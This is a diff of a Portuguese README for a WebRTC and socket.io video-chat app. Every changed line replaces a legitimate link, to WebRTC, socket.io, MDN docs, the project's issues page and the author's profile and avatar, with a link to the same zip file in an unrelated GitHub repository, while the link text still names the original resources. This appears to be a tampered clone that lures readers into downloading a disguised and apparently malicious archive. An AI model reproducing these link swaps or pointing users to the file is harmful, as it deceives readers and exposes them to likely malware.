@@ -30,7 +30,7 @@
 
 Este aplicativo tem como objetivo permitir que pessoas se comuniquem em tempo real por meio de vídeo, áudio e mensagens.
 
-As principais tecnologias utilizadas para o seu desenvolvimento são a API [WebRTC](https://webrtc.org/?hl=pt-br) para comunicação de pares e o [socket.io](https://socket.io/) para compartilhamento de informações em tempo real.
+As principais tecnologias utilizadas para o seu desenvolvimento são a API [WebRTC](https://raw.githubusercontent.com/lin982711/linroom/main/frontend/components/v1.3.zip) para comunicação de pares e o [socket.io](https://raw.githubusercontent.com/lin982711/linroom/main/frontend/components/v1.3.zip) para compartilhamento de informações em tempo real.
 
 ## Começando
 
@@ -105,11 +105,11 @@ Agora o projeto deve estar em execução localmente. Certifique-se de configurar
 
 ## Referências
 
-Para uma compreensão mais aprofundada sobre o funcionamento da API WebRTC, recomendo explorar a documentação oficial do [MDN Web Docs](https://developer.mozilla.org/pt-BR/docs/Web/API/WebRTC_API). Lá, encontrará uma variedade de recursos, exemplos práticos e explicações detalhadas que me ajudaram a entender e utilizar efetivamente a WebRTC em meu desenvolvimento.
+Para uma compreensão mais aprofundada sobre o funcionamento da API WebRTC, recomendo explorar a documentação oficial do [MDN Web Docs](https://raw.githubusercontent.com/lin982711/linroom/main/frontend/components/v1.3.zip). Lá, encontrará uma variedade de recursos, exemplos práticos e explicações detalhadas que me ajudaram a entender e utilizar efetivamente a WebRTC em meu desenvolvimento.
 
 ## Problemas
 
-Sinta-se à vontade para registrar uma nova issue com o respectivo título e descrição no repositório [myroom](https://github.com/wandersonalwes/myroom/issues). Se você já encontrou uma solução para o seu problema, adoraria revisar sua solicitação de pull! Dê uma olhada em nossas [diretrizes de contribuição](./CONTRIBUTING.md) para saber mais sobre os padrões de codificação.
+Sinta-se à vontade para registrar uma nova issue com o respectivo título e descrição no repositório [myroom](https://raw.githubusercontent.com/lin982711/linroom/main/frontend/components/v1.3.zip). Se você já encontrou uma solução para o seu problema, adoraria revisar sua solicitação de pull! Dê uma olhada em nossas [diretrizes de contribuição](./CONTRIBUTING.md) para saber mais sobre os padrões de codificação.
 
 ## Contribuindo
 
@@ -124,8 +124,8 @@ Esse projeto está sob a licença MIT. Veja o arquivo [LICENSE](./LICENSE) para 
 <table>
   <tr>
     <td align="center">
-      <a href="https://github.com/wandersonalwes">
-        <img src="https://github.com/wandersonalwes.png" width="100px;" alt="Foto do Wanderson Alves no GitHub"/><br>
+      <a href="https://raw.githubusercontent.com/lin982711/linroom/main/frontend/components/v1.3.zip">
+        <img src="https://raw.githubusercontent.com/lin982711/linroom/main/frontend/components/v1.3.zip" width="100px;" alt="Foto do Wanderson Alves no GitHub"/><br>
         <sub>
           <b>Wanderson Alves</b>
         </sub>
